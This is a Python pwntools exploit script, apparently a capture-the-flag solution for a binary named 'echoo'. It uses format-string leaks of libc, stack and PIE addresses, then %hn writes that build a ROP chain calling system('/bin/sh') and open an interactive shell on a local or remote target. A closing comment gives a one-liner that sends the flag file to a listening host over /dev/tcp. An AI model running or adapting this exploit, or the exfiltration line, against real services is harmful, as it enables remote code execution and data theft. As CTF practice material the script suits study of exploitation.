#!/usr/bin/env python3
'''
Pwn3d by pwn2ooown
'''
from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./echoo_patched")
    
    
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

sl("%3$paaa")
libc = int(ru("aaa"),16) - 0x11ba61
leak("libc",hex(libc))
sl("%48$paaa")
stack = int(ru("aaa"),16)
leak("stack",hex(stack))
sl("%48$s")

ret_addr = stack + 0xd78
leak("ret",hex(ret_addr))
# 48 -> 92 -> 50
def write_byte(addr,value):
    need = stack-0x150
    # leak("need",hex(need))
    ooo = need % 65536
    sl("%"+str(ooo)+"c%48$hnaaaaa\x00")
    ru("aaaaa")
    # sl("%92$p")
    aaa = addr % 65536
    sl("%"+str(aaa)+"c%92$hnaaaaa\x00")
    ru("aaaaa")
    print("write 1 done")
    need = stack-0x150+2
    # leak("need",hex(need))
    ooo = need % 65536
    sl("%"+str(ooo)+"c%48$hnaaaaa\x00")
    ru("aaaaa")
    # # sl("%92$p")
    aaa = ( addr //65536)% 65536
    sl("%"+str(aaa)+"c%92$hnaaaaa\x00")
    ru("aaaaa")

    need = stack-0x150 + 4
    # leak("need",hex(need))
    ooo = need % 65536
    sl("%"+str(ooo)+"c%48$hnaaaaa\x00")
    ru("aaaaa")
    # sl("%92$p")
    aaa =( addr //65536 // 65536)% 65536
    sl("%"+str(aaa)+"c%92$hnaaaaa\x00")
    ru("aaaaa")
    sl("%"+str(value)+"c%50$hnaaaaa\x00")
    ru("aaaaa")

def writeaddr(aaaa,value):
    write_byte(aaaa,value%65536)
    write_byte(aaaa+2,( value //65536)% 65536)
    write_byte(aaaa+4,( value //65536 // 65536)% 65536)
pop_rdi = libc+ 0x10f75b
system = libc+0x58740
bin_sh = libc+0x1cb42f
ret = pop_rdi+1
writeaddr(ret_addr,pop_rdi)
writeaddr(ret_addr+8,bin_sh)
writeaddr(ret_addr+16,ret)
writeaddr(ret_addr+24,system)
print("ooo")
leak("ret",hex(ret_addr))

need = stack-0x2d8+0x20
leak("need",hex(need))
ooo = need % 65536
print(hex(need))
sl("%"+str(ooo)+"c%48$hnaaa\x00")
ru("aaa")
sl("aaa%92$saaa")
ru("aaa")
pie = u64(r.recv(6)+b'\x00\x00')-0x1253
print(hex(pie))
need_change = pie+0x4010
print(hex(need_change))
if args.GDB:
    gdb.attach(r,"b printf")


write_byte(need_change+0,0x1000)
write_byte(need_change+1,0x1000)
write_byte(need_change+2,0x1000)
write_byte(need_change+3,0x1000)
print("write addr done")

r.interactive()

'''
Writeup:
Leak libc trivial
Leak pie: use argv trick to point to somewhere in near rsp (stores a codebase address)
Write rop chain and write the global value to 0 to exit the while loop
'''


'''
cat /home/`whoami`/f*



In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
'''